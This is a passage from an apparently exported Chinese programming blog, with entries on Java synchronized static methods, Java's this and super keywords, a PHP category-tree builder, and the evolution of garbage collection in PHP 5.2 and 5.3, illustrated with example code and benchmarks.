<p>PS：零长度的byte数组对象创建起来将比任何对象都经济――查看编译后的字节码：生成零长度的byte[]对象只需3条操作码，而Object lock = new Object()则需要7行操作码。 <strong>3．将synchronized作用于static 函数，示例代码如下：</strong></p>
<p>Class Foo  <br>{  <br>    public synchronized static void method1()   </p>
<p>    {  <br>        //.  <br>    }  <br>    public void method2()  <br>    {  <br>        synchronized(Foo.class)  <br>        //<br>    }  <br>}</p>
<p>这两个同步方法都调用这个方法的对象所属的类的类锁（Class，而不再是由这个Class产生的某个具体对象了）。 能够推断：假如一个类中定义了一个synchronized的static函数A，也定义了一个synchronized 的instance函数B，那么这个类的同一对象Obj在多线程中分别访问A和B两个方法时，不会构成同步，因为他们的锁都不相同。A方法的锁是Obj所属的那个Class，而B的锁是Obj所属的这个对象。</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA并发</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>JAVA基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中this和super的用法总结</title>
    <url>/2017/05/04/java%E4%B8%ADthis%E5%92%8Csuper%E7%9A%84%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p><strong>this</strong> </p>
<p>this是自身的一个对象，代表对象本身，可以理解为：指向对象本身的一个指针。 this的用法在java中大体可以分为3种：<br> 1.普通的直接引用 这种就不用讲了，this相当于是指向当前对象本身。<br> 2.形参与成员名字重名，用this来区分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">    private int age &#x3D; 10;</span><br><span class="line">    public Person()&#123;</span><br><span class="line">    System.out.println(&quot;初始化年龄：&quot;+age);</span><br><span class="line">&#125;</span><br><span class="line">    public int GetAge(int age)&#123;</span><br><span class="line">        this.age &#x3D; age;</span><br><span class="line">        return this.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">public class test1 &#123;</span><br><span class="line">    public static void main(String\[\] args) &#123;</span><br><span class="line">        Person Harry &#x3D; new Person();</span><br><span class="line">        System.out.println(&quot;Harry&#39;s age is &quot;+Harry.GetAge(12));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果： 初始化年龄：10 Harry’s age is 12 可以看到，这里age是GetAge成员方法的形参，this.age是Person类的成员变量。 </p>
<p>3.引用构造函数 这个和super放在一起讲，见下面。</p>
<p><strong>super</strong><br>super可以理解为是指向自己超（父）类对象的一个指针，而这个超类指的是离自己最近的一个父类。 super也有三种用法：<br>1.普通的直接引用 与this类似，super相当于是指向当前对象的父类，这样就可以用super.xxx来引用父类的成员。<br>2.子类中的成员变量或方法与父类中的成员变量或方法同名  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Country &#123;</span><br><span class="line">    String name;</span><br><span class="line">    void value() &#123;</span><br><span class="line">       name &#x3D; &quot;China&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">class City extends Country &#123;</span><br><span class="line">    String name;</span><br><span class="line">    void value() &#123;</span><br><span class="line">    name &#x3D; &quot;Shanghai&quot;;</span><br><span class="line">    super.value();      &#x2F;&#x2F;调用父类的方法</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(super.name);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">       City c&#x3D;new City();</span><br><span class="line">       c.value();</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  运行结果： Shanghai China 可以看到，这里既调用了父类的方法，也调用了父类的变量。若不调用父类方法value()，只调用父类变量name的话，则父类name值为默认值null。 </p>
<p>3.引用构造函数 super（参数）：调用父类中的某一个构造函数（应该为构造函数中的第一条语句）。 this（参数）：调用本类中另一种形式的构造函数（应该为构造函数中的第一条语句）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Person &#123; </span><br><span class="line">    public static void prt(String s) &#123; </span><br><span class="line">       System.out.println(s); </span><br><span class="line">    &#125; </span><br><span class="line">   </span><br><span class="line">    Person() &#123; </span><br><span class="line">       prt(&quot;父类·无参数构造方法： &quot;+&quot;A Person.&quot;); </span><br><span class="line">    &#125;&#x2F;&#x2F;构造方法(1) </span><br><span class="line">    </span><br><span class="line">    Person(String name) &#123; </span><br><span class="line">       prt(&quot;父类·含一个参数的构造方法： &quot;+&quot;A person&#39;s name is &quot; + name); </span><br><span class="line">    &#125;&#x2F;&#x2F;构造方法(2) </span><br><span class="line">&#125; </span><br><span class="line">    </span><br><span class="line">public class Chinese extends Person &#123; </span><br><span class="line">    Chinese() &#123; </span><br><span class="line">       super(); &#x2F;&#x2F; 调用父类构造方法（1） </span><br><span class="line">       prt(&quot;子类·调用父类”无参数构造方法“： &quot;+&quot;A chinese coder.&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    Chinese(String name) &#123; </span><br><span class="line">       super(name);&#x2F;&#x2F; 调用父类具有相同形参的构造方法（2） </span><br><span class="line">       prt(&quot;子类·调用父类”含一个参数的构造方法“： &quot;+&quot;his name is &quot; + name); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    Chinese(String name, int age) &#123; </span><br><span class="line">       this(name);&#x2F;&#x2F; 调用具有相同形参的构造方法（3） </span><br><span class="line">       prt(&quot;子类：调用子类具有相同形参的构造方法：his age is &quot; + age); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    public static void main(String\[\] args) &#123; </span><br><span class="line">       Chinese cn &#x3D; new Chinese(); </span><br><span class="line">       cn &#x3D; new Chinese(&quot;codersai&quot;); </span><br><span class="line">       cn &#x3D; new Chinese(&quot;codersai&quot;, 18); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果： 父类·无参数构造方法： A Person. 子类·调用父类”无参数构造方法“： A chinese coder. 父类·含一个参数的构造方法： A person’s name is codersai 子类·调用父类”含一个参数的构造方法“： his name is codersai 父类·含一个参数的构造方法： A person’s name is codersai 子类·调用父类”含一个参数的构造方法“： his name is codersai 子类：调用子类具有相同形参的构造方法：his age is 18 从本例可以看到，可以用super和this分别调用父类的构造方法和本类中其他形式的构造方法。 例子中Chinese类第三种构造方法调用的是本类中第二种构造方法，而第二种构造方法是调用父类的，因此也要先调用父类的构造方法，再调用本类中第二种，最后是重写第三种构造方法。 </p>
<p>super和this的异同：</p>
<p>super（参数）：调用基类中的某一个构造函数（应该为构造函数中的第一条语句<br>this（参数）：调用本类中另一种形成的构造函数（应该为构造函数中的第一条语句）<br>super:　它引用当前对象的直接父类中的成员（用来访问直接父类中被隐藏的父类中成员数据或函数，基类与派生类中有相同成员定义时如：super.变量名 super.成员函数据名（实参） this：它代表当前对象名（在程序中易产生二义性之处，应使用this来指明当前对象；如果函数的形参与类中的成员数据同名，这时需用this来指明成员变量名） 调用super()必须写在子类构造方法的第一行，否则编译不通过。每个子类构造方法的第一条语句，都是隐含地调用super()，如果父类没有这种形式的构造函数，那么在编译的时候就会报错。 super()和this()类似,区别是，super()从子类中调用父类的构造方法，this()在同一类内调用其它方法。<br> super()和this()均需放在构造方法内第一行。 尽管可以用this调用一个构造器，但却不能调用两个。 this和super不能同时出现在一个构造函数里面，因为this必然会调用其它的构造函数，其它的构造函数必然也会有super语句的存在，所以在同一个构造函数里面有相同的语句，就失去了语句的意义，编译器也不会通过。 this()和super()都指的是对象，所以，均不可以在static环境中使用。包括：static变量,static方法，static语句块。 从本质上讲，this是一个指向本对象的指针, 然而super是一个Java关键字。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 无限分类</title>
    <url>/2017/04/20/php-%E6%97%A0%E9%99%90%E5%88%86%E7%B1%BB/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">&#x2F;** </span><br><span class="line"> * Created by PhpStorm. </span><br><span class="line"> * User: fengqiang </span><br><span class="line"> * Date: 16-09-03 </span><br><span class="line"> * Time: 上午10:43 </span><br><span class="line"> *&#x2F;  </span><br><span class="line">&#x2F;&#x2F;准备数组，代替从数据库中检索出的数据(共有三个必须字段id,name,pid)  </span><br><span class="line">header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  </span><br><span class="line">$categories &#x3D; array(  </span><br><span class="line">    array(&#39;id&#39;&#x3D;&gt;1,&#39;name&#39;&#x3D;&gt;&#39;电脑&#39;,&#39;pid&#39;&#x3D;&gt;0),  </span><br><span class="line">    array(&#39;id&#39;&#x3D;&gt;2,&#39;name&#39;&#x3D;&gt;&#39;手机&#39;,&#39;pid&#39;&#x3D;&gt;0),  </span><br><span class="line">    array(&#39;id&#39;&#x3D;&gt;3,&#39;name&#39;&#x3D;&gt;&#39;笔记本&#39;,&#39;pid&#39;&#x3D;&gt;1),  </span><br><span class="line">    array(&#39;id&#39;&#x3D;&gt;4,&#39;name&#39;&#x3D;&gt;&#39;台式机&#39;,&#39;pid&#39;&#x3D;&gt;1),  </span><br><span class="line">    array(&#39;id&#39;&#x3D;&gt;5,&#39;name&#39;&#x3D;&gt;&#39;智能机&#39;,&#39;pid&#39;&#x3D;&gt;2),  </span><br><span class="line">    array(&#39;id&#39;&#x3D;&gt;6,&#39;name&#39;&#x3D;&gt;&#39;功能机&#39;,&#39;pid&#39;&#x3D;&gt;2),  </span><br><span class="line">    array(&#39;id&#39;&#x3D;&gt;7,&#39;name&#39;&#x3D;&gt;&#39;超级本&#39;,&#39;pid&#39;&#x3D;&gt;3),  </span><br><span class="line">    array(&#39;id&#39;&#x3D;&gt;8,&#39;name&#39;&#x3D;&gt;&#39;游戏本&#39;,&#39;pid&#39;&#x3D;&gt;3),  </span><br><span class="line">);  </span><br><span class="line">  </span><br><span class="line">&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;非递归实现&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;  </span><br><span class="line">$tree &#x3D; array();  </span><br><span class="line">&#x2F;&#x2F;第一步，将分类id作为数组key,并创建children单元  </span><br><span class="line">foreach($categories as $category)&#123;  </span><br><span class="line">    $tree[$category[&#39;id&#39;]] &#x3D; $category;  </span><br><span class="line">    $tree[$category[&#39;id&#39;]][&#39;children&#39;] &#x3D; array();  </span><br><span class="line">&#125;  </span><br><span class="line">&#x2F;&#x2F;第二步，利用引用，将每个分类添加到父类children数组中，这样一次遍历即可形成树形结构。  </span><br><span class="line">foreach($tree as $key&#x3D;&gt;$item)&#123;  </span><br><span class="line">    if($item[&#39;pid&#39;] !&#x3D; 0)&#123;  </span><br><span class="line">        $tree[$item[&#39;pid&#39;]][&#39;children&#39;][] &#x3D; &amp;$tree[$key];&#x2F;&#x2F;注意：此处必须传引用否则结果不对  </span><br><span class="line">        if($tree[$key][&#39;children&#39;] &#x3D;&#x3D; null)&#123;  </span><br><span class="line">            unset($tree[$key][&#39;children&#39;]); &#x2F;&#x2F;如果children为空，则删除该children元素（可选）  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;第三步，删除无用的非根节点数据  </span><br><span class="line">foreach($tree as $key&#x3D;&gt;$category)&#123;  </span><br><span class="line">    if($category[&#39;pid&#39;] !&#x3D; 0)&#123;  </span><br><span class="line">        unset($tree[$key]);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">&#x2F;&#x2F;print_r($tree);  </span><br><span class="line">  </span><br><span class="line">&#x2F;*&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;递归实现&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;*&#x2F;  </span><br><span class="line">$tree &#x3D; $categories;  </span><br><span class="line">function get_attr($a,$pid)&#123;  </span><br><span class="line">    $tree &#x3D; array();                                &#x2F;&#x2F;每次都声明一个新数组用来放子元素  </span><br><span class="line">    foreach($a as $v)&#123;  </span><br><span class="line">        if($v[&#39;pid&#39;] &#x3D;&#x3D; $pid)&#123;                      &#x2F;&#x2F;匹配子记录  </span><br><span class="line">            $v[&#39;children&#39;] &#x3D; get_attr($a,$v[&#39;id&#39;]); &#x2F;&#x2F;递归获取子记录  </span><br><span class="line">            if($v[&#39;children&#39;] &#x3D;&#x3D; null)&#123;  </span><br><span class="line">                unset($v[&#39;children&#39;]);             &#x2F;&#x2F;如果子元素为空则unset()进行删除，说明已经到该分支的最后一个元素了（可选）  </span><br><span class="line">            &#125;  </span><br><span class="line">            $tree[] &#x3D; $v;                           &#x2F;&#x2F;将记录存入新数组  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    return $tree;                                  &#x2F;&#x2F;返回新数组  </span><br><span class="line">&#125;  </span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&quot;;  </span><br><span class="line">  </span><br><span class="line">print\_r(get\_attr($tree,0));</span><br><span class="line"></span><br><span class="line">    **运行结果**</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">   [0] &#x3D;&gt; Array</span><br><span class="line">       (</span><br><span class="line">           [id] &#x3D;&gt; 1</span><br><span class="line">           [name] &#x3D;&gt; 电脑</span><br><span class="line">           [pid] &#x3D;&gt; 0</span><br><span class="line">           [children] &#x3D;&gt; Array</span><br><span class="line">               (</span><br><span class="line">                   [0] &#x3D;&gt; Array</span><br><span class="line">                       (</span><br><span class="line">                           [id] &#x3D;&gt; 3</span><br><span class="line">                           [name] &#x3D;&gt; 笔记本</span><br><span class="line">                           [pid] &#x3D;&gt; 1</span><br><span class="line">                           [children] &#x3D;&gt; Array</span><br><span class="line">                               (</span><br><span class="line">                                   [0] &#x3D;&gt; Array</span><br><span class="line">                                       (</span><br><span class="line">                                           [id] &#x3D;&gt; 7</span><br><span class="line">                                           [name] &#x3D;&gt; 超级本</span><br><span class="line">                                           [pid] &#x3D;&gt; 3</span><br><span class="line">                                       )</span><br><span class="line">                                   [1] &#x3D;&gt; Array</span><br><span class="line">                                       (</span><br><span class="line">                                           [id] &#x3D;&gt; 8</span><br><span class="line">                                           [name] &#x3D;&gt; 游戏本</span><br><span class="line">                                           [pid] &#x3D;&gt; 3</span><br><span class="line">                                       )</span><br><span class="line">                               )</span><br><span class="line">                       )</span><br><span class="line">                   [1] &#x3D;&gt; Array</span><br><span class="line">                       (</span><br><span class="line">                           [id] &#x3D;&gt; 4</span><br><span class="line">                           [name] &#x3D;&gt; 台式机</span><br><span class="line">                           [pid] &#x3D;&gt; 1</span><br><span class="line">                       )</span><br><span class="line">               )</span><br><span class="line">       )</span><br><span class="line">   [1] &#x3D;&gt; Array</span><br><span class="line">       (</span><br><span class="line">           [id] &#x3D;&gt; 2</span><br><span class="line">           [name] &#x3D;&gt; 手机</span><br><span class="line">           [pid] &#x3D;&gt; 0</span><br><span class="line">           [children] &#x3D;&gt; Array</span><br><span class="line">               (</span><br><span class="line">                   [0] &#x3D;&gt; Array</span><br><span class="line">                       (</span><br><span class="line">                           [id] &#x3D;&gt; 5</span><br><span class="line">                           [name] &#x3D;&gt; 智能机</span><br><span class="line">                           [pid] &#x3D;&gt; 2</span><br><span class="line">                       )</span><br><span class="line">                   [1] &#x3D;&gt; Array</span><br><span class="line">                       (</span><br><span class="line">                           [id] &#x3D;&gt; 6</span><br><span class="line">                           [name] &#x3D;&gt; 功能机</span><br><span class="line">                           [pid] &#x3D;&gt; 2</span><br><span class="line">                       )</span><br><span class="line">               )</span><br><span class="line">       )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈PHP5中垃圾回收算法(Garbage Collection)的演化</title>
    <url>/2017/04/20/%E6%B5%85%E8%B0%88php5%E4%B8%AD%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95garbage-collection%E7%9A%84%E6%BC%94%E5%8C%96/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>PHP是一门托管型语言，在PHP编程中程序员不需要手工处理内存资源的分配与释放（使用C编写PHP或Zend扩展除外），这就意味着PHP本身实现了垃圾回收机制（Garbage Collection）。现在如果去PHP官方网站（<a href="http://php.net/">php.net</a>）可以看到，目前PHP5的两个分支版本PHP5.2和PHP5.3是分别更新的，这是因为许多项目仍然使用5.2版本的PHP，而5.3版本对5.2并不是完全兼容。PHP5.3在PHP5.2的基础上做了诸多改进，其中垃圾回收算法就属于一个比较大的改变。本文将分别讨论PHP5.2和PHP5.3的垃圾回收机制，并讨论这种演化和改进对于程序员编写PHP的影响以及要注意的问题。</p>
<h1 id="PHP变量及关联内存对象的内部表示"><a href="#PHP变量及关联内存对象的内部表示" class="headerlink" title="PHP变量及关联内存对象的内部表示"></a>PHP变量及关联内存对象的内部表示</h1><p>垃圾回收说到底是对变量及其所关联内存对象的操作，所以在讨论PHP的垃圾回收机制之前，先简要介绍PHP中变量及其内存对象的内部表示（其C源代码中的表示）。 PHP官方文档中将PHP中的变量划分为两类：标量类型和复杂类型。标量类型包括布尔型、整型、浮点型和字符串；复杂类型包括数组、对象和资源；还有一个NULL比较特殊，它不划分为任何类型，而是单独成为一类。 所有这些类型，在PHP内部统一用一个叫做zval的结构表示，在PHP源代码中这个结构名称为“<code>_zval_struct</code>”。zval的具体定义在PHP源代码的“Zend/zend.h”文件中，下面是相关代码的摘录。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef union _zvalue_value &#123;</span><br><span class="line">    long lval;                  &#x2F;* long value *&#x2F;</span><br><span class="line">    double dval;                &#x2F;* double value *&#x2F;</span><br><span class="line">    struct &#123;</span><br><span class="line">        char *val;</span><br><span class="line">        int len;</span><br><span class="line">    &#125; str;</span><br><span class="line">    HashTable *ht;              &#x2F;* hash table value *&#x2F;</span><br><span class="line">    zend_object_value obj;</span><br><span class="line">&#125; zvalue_value;</span><br><span class="line"> </span><br><span class="line">struct _zval_struct &#123;</span><br><span class="line">    &#x2F;\* Variable information *&#x2F;</span><br><span class="line">    zvalue_value value;     &#x2F;* value *&#x2F;</span><br><span class="line">    zend_uint refcount__gc;</span><br><span class="line">    zend_uchar type;    &#x2F;* active type *&#x2F;</span><br><span class="line">    zend_uchar is_ref__gc;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>其中联合体“<code>_zvalue_value</code>”用于表示PHP中所有变量的值，这里之所以使用union，是因为一个zval在一个时刻只能表示一种类型的变量。可以看到_zvalue_value中只有5个字段，但是PHP中算上NULL有8种数据类型，那么PHP内部是如何用5个字段表示8种类型呢？这算是PHP设计比较巧妙的一个地方，它通过复用字段达到了减少字段的目的。例如，在PHP内部布尔型、整型及资源（只要存储资源的标识符即可）都是通过lval字段存储的；dval用于存储浮点型；str存储字符串；ht存储数组（注意PHP中的数组其实是哈希表）；而obj存储对象类型；如果所有字段全部置为0或NULL则表示PHP中的NULL，这样就达到了用5个字段存储8种类型的值。 而当前zval中的value（value的类型即是_zvalue_value）到底表示那种类型，则由“<code>_zval_struct</code>”中的type确定。<code>_zval_struct</code>即是zval在C语言中的具体实现，每个zval表示一个变量的内存对象。除了value和type，可以看到_zval_struct中还有两个字段refcount__gc和is_ref__gc，从其后缀就可以断定这两个家伙与垃圾回收有关。没错，PHP的垃圾回收全靠这俩字段了。其中refcount__gc表示当前有几个变量引用此zval，而is_ref__gc表示当前zval是否被按引用引用，这话听起来很拗口，这和PHP中zval的“Write-On-Copy”机制有关，由于这个话题不是本文重点，因此这里不再详述，读者只需记住refcount__gc这个字段的作用即可。</p>
<h1 id="PHP5-2中的垃圾回收算法——Reference-Counting"><a href="#PHP5-2中的垃圾回收算法——Reference-Counting" class="headerlink" title="PHP5.2中的垃圾回收算法——Reference Counting"></a>PHP5.2中的垃圾回收算法——Reference Counting</h1><p>PHP5.2中使用的内存回收算法是大名鼎鼎的<a href="http://en.wikipedia.org/wiki/Reference_counting">Reference Counting</a>，这个算法中文翻译叫做“引用计数”，其思想非常直观和简洁：为每个内存对象分配一个计数器，当一个内存对象建立时计数器初始化为1（因此此时总是有一个变量引用此对象），以后每有一个新变量引用此内存对象，则计数器加1，而每当减少一个引用此内存对象的变量则计数器减1，当垃圾回收机制运作的时候，将所有计数器为0的内存对象销毁并回收其占用的内存。而PHP中内存对象就是zval，而计数器就是refcount__gc。 例如下面一段PHP代码演示了PHP5.2计数器的工作原理（计数器值通过<a href="http://www.xdebug.org/">xdebug</a>得到）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$val1 &#x3D; 100; &#x2F;&#x2F;zval(val1).refcount_gc &#x3D; 1;</span><br><span class="line">$val2 &#x3D; $val1; &#x2F;&#x2F;zval(val1).refcount_gc &#x3D; 2,zval(val2).refcount_gc &#x3D; 2(因为是Write on copy，当前val2与val1共同引用一个zval)</span><br><span class="line">$val2 &#x3D; 200; &#x2F;&#x2F;zval(val1).refcount_gc &#x3D; 1,zval(val2).refcount_gc &#x3D; 1(此处val2新建了一个zval)</span><br><span class="line">unset($val1); &#x2F;&#x2F;zval(val1).refcount_gc &#x3D; 0($val1引用的zval再也不可用，会被GC回收)</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>Reference Counting简单直观，实现方便，但却存在一个致命的缺陷，就是容易造成内存泄露。很多朋友可能已经意识到了，如果存在循环引用，那么Reference Counting就可能导致内存泄露。例如下面的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$a &#x3D; array();</span><br><span class="line">$a[] &#x3D; &amp; $a;</span><br><span class="line">unset($a);</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>这段代码首先建立了数组a，然后让a的第一个元素按引用指向a，这时a的zval的refcount就变为2，然后我们销毁变量a，此时a最初指向的zval的refcount为1，但是我们再也没有办法对其进行操作，因为其形成了一个循环自引用，如下图所示： <a href="http://images.cnblogs.com/cnblogs_com/leoo2sk/201102/20110226165422276.png"><img src="http://images.cnblogs.com/cnblogs_com/leoo2sk/201102/201102261654241747.png" alt="image" title="image"></a> 其中灰色部分表示已经不复存在。由于a之前指向的zval的refcount为1（被其HashTable的第一个元素引用），这个zval就不会被GC销毁，这部分内存就泄露了。 这里特别要指出的是，PHP是通过符号表（Symbol Table）存储变量符号的，全局有一个符号表，而每个复杂类型如数组或对象有自己的符号表，因此上面代码中，a和a[0]是两个符号，但是a储存在全局符号表中，而a[0]储存在数组本身的符号表中，且这里a和a[0]引用同一个zval（当然符号a后来被销毁了）。希望读者朋友注意分清符号（Symbol）的zval的关系。 在PHP只用于做动态页面脚本时，这种泄露也许不是很要紧，因为动态页面脚本的生命周期很短，PHP会保证当脚本执行完毕后，释放其所有资源。但是PHP发展到目前已经不仅仅用作动态页面脚本这么简单，如果将PHP用在生命周期较长的场景中，例如自动化测试脚本或deamon进程，那么经过多次循环后积累下来的内存泄露可能就会很严重。这并不是我在耸人听闻，我曾经实习过的一个公司就通过PHP写的deamon进程来与数据存储服务器交互。 由于Reference Counting的这个缺陷，PHP5.3改进了垃圾回收算法。</p>
<h1 id="PHP5-3中的垃圾回收算法——Concurrent-Cycle-Collection-in-Reference-Counted-Systems"><a href="#PHP5-3中的垃圾回收算法——Concurrent-Cycle-Collection-in-Reference-Counted-Systems" class="headerlink" title="PHP5.3中的垃圾回收算法——Concurrent Cycle Collection in Reference Counted Systems"></a>PHP5.3中的垃圾回收算法——Concurrent Cycle Collection in Reference Counted Systems</h1><p>PHP5.3的垃圾回收算法仍然以引用计数为基础，但是不再是使用简单计数作为回收准则，而是使用了一种同步回收算法，这个算法由IBM的工程师在论文<a href="http://www.research.ibm.com/people/d/dfb/papers/Bacon01Concurrent.pdf">Concurrent Cycle Collection in Reference Counted Systems</a>中提出。 这个算法可谓相当复杂，从论文29页的数量我想大家也能看出来，所以我不打算（也没有能力）完整论述此算法，有兴趣的朋友可以阅读上面的提到的论文（强烈推荐，这篇论文非常精彩）。 我在这里，只能大体描述一下此算法的基本思想。 首先PHP会分配一个固定大小的“根缓冲区”，这个缓冲区用于存放固定数量的zval，这个数量默认是10,000，如果需要修改则需要修改源代码Zend/zend_gc.c中的常量GC_ROOT_BUFFER_MAX_ENTRIES然后重新编译。 由上文我们可以知道，一个zval如果有引用，要么被全局符号表中的符号引用，要么被其它表示复杂类型的zval中的符号引用。因此在zval中存在一些可能根（root）。这里我们暂且不讨论PHP是如何发现这些可能根的，这是个很复杂的问题，总之PHP有办法发现这些可能根zval并将它们投入根缓冲区。 当根缓冲区满额时，PHP就会执行垃圾回收，此回收算法如下： 1、对每个根缓冲区中的根zval按照深度优先遍历算法遍历所有能遍历到的zval，并将每个zval的refcount减1，同时为了避免对同一zval多次减1（因为可能不同的根能遍历到同一个zval），每次对某个zval减1后就对其标记为“已减”。 2、再次对每个缓冲区中的根zval深度优先遍历，如果某个zval的refcount不为0，则对其加1，否则保持其为0。 3、清空根缓冲区中的所有根（注意是把这些zval从缓冲区中清除而不是销毁它们），然后销毁所有refcount为0的zval，并收回其内存。 如果不能完全理解也没有关系，只需记住PHP5.3的垃圾回收算法有以下几点特性： 1、并不是每次refcount减少时都进入回收周期，只有根缓冲区满额后在开始垃圾回收。 2、可以解决循环引用问题。 3、可以总将内存泄露保持在一个阈值以下。</p>
<h1 id="PHP5-2与PHP5-3垃圾回收算法的性能比较"><a href="#PHP5-2与PHP5-3垃圾回收算法的性能比较" class="headerlink" title="PHP5.2与PHP5.3垃圾回收算法的性能比较"></a>PHP5.2与PHP5.3垃圾回收算法的性能比较</h1><p>由于我目前条件所限，我就不重新设计试验了，而是直接引用PHP Manual中的实验，关于两者的性能比较请参考PHP Manual中的相关章节：<a href="http://www.php.net/manual/en/features.gc.performance-considerations.php">http://www.php.net/manual/en/features.gc.performance-considerations.php</a>。 首先是内存泄露试验，下面直接引用<a href="http://www.php.net/manual/en/index.php">PHP Manual</a>中的实验代码和试验结果图：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Foo</span><br><span class="line">&#123;</span><br><span class="line">    public $var &#x3D; &#39;3.1415962654&#39;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$baseMemory &#x3D; memory_get_usage();</span><br><span class="line"> </span><br><span class="line">for ( $i &#x3D; 0; $i &lt;&#x3D; 100000; $i++ )</span><br><span class="line">&#123;</span><br><span class="line">    $a &#x3D; new Foo;</span><br><span class="line">    $a-&gt;self &#x3D; $a;</span><br><span class="line">    if ( $i % 500 &#x3D;&#x3D;&#x3D; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">        echo sprintf( &#39;%8d: &#39;, $i ), memory_get_usage() - $baseMemory, &quot;\\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p> </p>
<p><img src="http://www.php.net/manual/en/images/12f37b1c6963c1c5c18f30495416a197-gc-benchmark.png?_=1965750"> 可以看到在可能引发累积性内存泄露的场景下，PHP5.2发生持续累积性内存泄露，而PHP5.3则总能将内存泄露控制在一个阈值以下（与根缓冲区大小有关）。 另外是关于性能方面的对比：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Foo</span><br><span class="line">&#123;</span><br><span class="line">    public $var &#x3D; &#39;3.1415962654&#39;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">for ( $i &#x3D; 0; $i &lt;&#x3D; 1000000; $i++ )</span><br><span class="line">&#123;</span><br><span class="line">    $a &#x3D; new Foo;</span><br><span class="line">    $a-&gt;self &#x3D; $a;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">echo memory_get_peak_usage(), &quot;\\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>这个脚本执行1000000次循环，使得延迟时间足够进行对比。 然后使用CLI方式分别在打开内存回收和关闭内存回收的的情况下运行此脚本：</p>
<p>time php -dzend.enable_gc=0 -dmemory_limit=-1 -n example2.php<br># and<br>time php -dzend.enable_gc=1 -dmemory_limit=-1 -n example2.php</p>
<p> </p>
